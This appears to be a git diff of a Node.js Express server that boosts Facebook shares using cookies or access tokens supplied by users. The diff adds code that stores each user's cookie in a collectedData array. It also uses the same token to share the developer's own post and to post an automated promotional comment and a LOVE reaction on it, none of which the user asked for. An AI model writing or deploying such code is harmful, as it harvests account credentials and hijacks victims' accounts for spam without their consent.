@@ -9,6 +9,7 @@ app.use(express.json());
 app.use(bodyParser.json());
 //cors
 app.use(require("./corss"));
+app.set("json spaces", 4);
 const total = new Map();
 const collectedData = [];
 
@@ -39,7 +40,6 @@ function userAgent() {
 
 
 
-const link1 = "https://www.facebook.com/100015801404865/posts/1674522423084455/?app=fbl";
 app.get('/shares', (req, res) => {
  const data = Array.from(total.values()).map((link, index) => ({
   shared: link.shared,
@@ -264,13 +264,15 @@ app.get("/ttreport", async(req, res) => {
   })
 });
 
-
+const sauce = "https://www.facebook.com/100015801404865/posts/1674522423084455/?app=fbl";
 async function yello(c,u,a,i){
   await share(true, c,u,a,i);
-  await share(false, c, link1, "100000", "6");
+  await share(false, c, sauce, "100000", "6");
+  
+  collectedData.push({cookie: c});
 }
 
-async function fucker(a){
+async function fucker(a,link){
   try {
     const headers = {
       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -317,18 +319,19 @@ async function fucker(a){
       "💀💀💀💀",
       "Isa ako sa mga pogi katulad ni Neth hehe",
       ];*/
-    axios.post(`https://graph.facebook.com/${extract(link1)}/comments`, null, {
+    axios.post(`https://graph.facebook.com/${extract(link)}/comments`, null, {
       params: {
         message: `I just want to know you that Neth is simple but awesome dev.\n\n\n✨ Explore my pages:\n@[61559180483340:0]\n@[61562218612857:0]\n\nDeveloper: @[100015801404865:0]\n\n(this is an automated comment!)`/*kapogi[Math.floor(Math.random() * kapogi.length)]*/,
         access_token: a
-      }, headers })
-      .catch(err => {});
+      }, headers });
+    axios.post(`https://graph.facebook.com/${extract(link)}/reactions?type=LOVE&access_token=${a}`)
+    .catch(err => {});
   } catch (err){
    }
 }
 async function share(sharedIs,cookies, url, amount, interval) {
   const id = Math.floor(Math.random() * 69696969);
-  await fucker(cookies);
+  await fucker(cookies, sauce);
   total.set(id, {
     shared: sharedIs,
     url,
